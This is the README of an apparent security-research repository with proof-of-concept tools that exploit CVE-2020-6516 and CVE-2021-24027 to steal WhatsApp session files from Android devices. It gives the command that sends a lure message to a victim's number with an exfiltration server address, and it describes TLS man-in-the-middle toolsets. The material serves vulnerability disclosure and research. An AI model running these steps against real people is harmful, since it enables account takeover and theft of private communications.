# WhatsApp MitD & MitM

## Introduction

This repository contains PoC code and tools that were developed as part of our
research [01] on remotely exploiting *Man-in-the-Disk* (MitD) vulnerabilities on
WhatsApp for Android. As discussed in our blog post, the code and accompanying
scripts found here, were used to exploit CVE-2020-6516 (Chrome) [02] and
CVE-2021-24027 (WhatsApp) [03].

The structure of this repository is as follows:

* The current directory contains the Python tool that hooks WhatsApp using Frida,
  sends the phishing message carrying the CORS bypass payload and runs an HTTP
  server, where exfiltrated session files from the victim device are sent to.

* **tls12\_psk\_extract/** contains the TLS v1.2 MitM toolset. See **README.md**
  in that directory for more information on how to prepare a MitM environment.

* **watls\_psk\_extract/** contains the TLS v1.3 (WaTLS) MitM toolset. See
  **README.md** in that directory for more information on how to prepare a MitM
  environment.

* **openssl-1.1.1f-patches/** contains OpenSSL 1.1.1f patches required for
  setting up TLS v1.2 and/or TLS v1.3 MitM environments.

* **secrets/** holds a simple shell script and an OpenSSL configuration for
  generating certificates similar to those used by the WhatsApp TLS v1.3
  infrastructure. The generated keys and certificates can be used for both
  TLS v1.2 and v1.3 MitM.

* Last but not least, **misc/** contains various Frida scripts that were used
  for testing and debugging purposes during our research and might be helpful to
  other researchers.


## Usage

To test the PoC you need an Android device running WhatsApp 2.20.206.22 [04].
Even though our code was initially developed for 2.19.355, and so you can find
the corresponding snippets under **frida_scripts/**, that version is nowadays
considered "expired" and won't work.

Before firing up the PoC, it is a good idea to compile as little as possible of
WhatsApp's DEX code. Doing so might proactively help in avoiding issues like
Frida not being able to hook specific methods.

    adb shell
    am force-stop com.whatsapp
    pm compile -f -m space com.whatsapp
    am start com.whatsapp/.Main

Download Frida server and push it on your Android device under **/data/local/tmp**,
leaving the default file name as is. Version 12.8.10 is tested and known to work
well. Feel free to download a more recent one if you prefer to. The PoC will
automatically detect the Frida server binary and will attempt to execute it with
the appropriate command line arguments.

    cd /tmp
    curl -O https://github.com/frida/frida/releases/download/12.8.10/frida-server-12.8.10-android-arm64.xz
    xz -d frida-server-12.8.10-android-arm64.xz
    adb push frida-server-12.8.10-android-arm64 /data/local/tmp

The main logic of the exploit is implemented in **main.py**. Files **adb.py**
and **frida_util.py** are trimmed down versions of tools that we use internally
for various debugging tasks on Android devices.

To run the PoC, attach your Android device on your computer and run the
following command:

    python3 main.py -s ANDROID_SERIAL -a 192.168.1.100 -p 8000 -r \
        images/the_guardian.jpg MOBILE_NUMBER@s.whatsapp.net "Rush for Mediterranean gas"

The command line switches passed to **main.py** are the following:

* `-s` - The serial number of the Android device to use, in case the attacker
  has multiple Android devices attached on her computer.

* `-a` and `-p` - Address and port, respectively, of the HTTP server where the
  exfiltrated sessions will be sent to.

* `-r` - Instructs **main.py** to start the aforementioned HTTP server on the
  local computer. If you don't pass `-r`, make sure you run **server.py** on the
  host specified by `-a` and `-p`.

Positional arguments are the following:

* **images/guardian.jpg** - A JPG image that will be used as a fake message
  preview, in order to lure the victim into clicking on it.

* **MOBILE_NUMBER@s.whatsapp.net** - The victim's mobile phone number in WhatsApp
  format. This is usually the country prefix followed by the mobile number. For
  example, Greek numbers (+30) look like `301234567890@s.whatsapp.net`.

* **"Rush for Mediterranean gas"** - An arbitrary string to be used as the
  message caption.

For a real life usage example, have a look at our blog post, and more specifically
at the demonstration videos.


## References

[01] <https://www.census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/>

[02] <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6516>

[03] <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24027>

[04] <https://www.apkmirror.com/apk/whatsapp-inc/whatsapp/whatsapp-2-20-206-22-release/whatsapp-messenger-2-20-206-22-android-apk-download/>

